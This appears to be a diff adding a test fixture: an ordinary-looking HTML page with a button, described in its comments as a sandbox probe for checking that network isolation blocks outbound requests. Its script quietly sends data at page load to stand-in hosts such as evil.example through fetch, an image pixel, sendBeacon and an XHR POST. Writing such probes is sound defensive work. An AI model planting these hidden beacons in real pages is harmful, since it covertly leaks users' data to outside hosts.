@@ -1,0 +1,22 @@
+<!doctype html>
+<html lang="en">
+<head><meta charset="utf-8"><title>Exfiltration probe</title></head>
+<body>
+  <h1>Looks harmless</h1>
+  <p>A perfectly ordinary page with a button.</p>
+  <button id="go">Click me</button>
+  <div id="out">ready</div>
+  <script>
+    // Sandbox probe: benign-looking artifact that quietly phones home.
+    // With isolation working, every one of these must be blocked.
+    fetch('https://example.com/collect?data=secret').catch(() => {});
+    new Image().src = 'https://evil.example/pixel?leak=1';
+    navigator.sendBeacon && navigator.sendBeacon('https://evil.example/beacon', 'x');
+    const x = new XMLHttpRequest();
+    try { x.open('POST', 'https://evil.example/xhr'); x.send('payload'); } catch (e) {}
+    document.getElementById('go').onclick = () => {
+      document.getElementById('out').textContent = 'clicked';
+    };
+  </script>
+</body>
+</html>
